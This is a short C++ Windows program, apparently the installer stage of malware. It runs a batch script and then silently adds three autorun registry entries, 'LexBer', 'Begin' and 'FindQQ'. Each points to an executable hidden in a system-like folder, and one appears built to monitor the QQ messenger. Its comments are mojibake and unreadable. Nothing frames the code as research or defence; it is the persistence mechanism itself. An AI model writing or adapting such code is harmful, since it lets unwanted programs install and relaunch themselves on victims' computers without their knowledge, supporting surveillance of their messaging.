#include<stdio.h>
#include<windows.h>
#include<iostream>
#include <tchar.h>
#include<cstdlib>
#include<ctime>
using namespace std ;

int main(){
    system("bin\\index.bat");
    HKEY hkey ;//�����\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
	TCHAR p[64] ;
    long ret;
    ret = RegCreateKey(HKEY_CURRENT_USER,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&hkey);
    if(ret==ERROR_SUCCESS){
        ret = RegSetValueEx(hkey,_T("LexBer"),0,REG_SZ,(const BYTE*)("d:\\windows\\setup.exe"),21);  // ��
        ret = RegSetValueEx(hkey,_T("Begin"),0,REG_SZ,(const BYTE*)("d:\\windows\\system32\\bin\\begin.exe"),35); // ��Ҫ����
        ret = RegSetValueEx(hkey,_T("FindQQ"),0,REG_SZ,(const BYTE*)("d:\\windows\\system32\\conf\\find.exe"),35);//���ʵʱ�仯
        if(ret==ERROR_SUCCESS){
            // д��ɹ�
        }else {
            // д��ʧ��
            cout << "Write filed !" ;
        }
    }else {
        cout << "Read error !" << endl ;
    }

    return 0 ;
}
